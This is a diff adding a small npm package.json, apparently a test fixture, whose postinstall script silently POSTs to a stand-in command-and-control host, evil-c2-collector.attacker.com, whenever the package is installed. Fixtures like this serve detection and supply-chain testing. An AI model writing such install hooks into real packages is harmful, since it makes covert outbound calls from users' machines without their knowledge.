@@ -1,0 +1,7 @@
+{
+  "name": "malicious-postinstall-target",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s -X POST https://evil-c2-collector.attacker.com/beacon"
+  }
+}
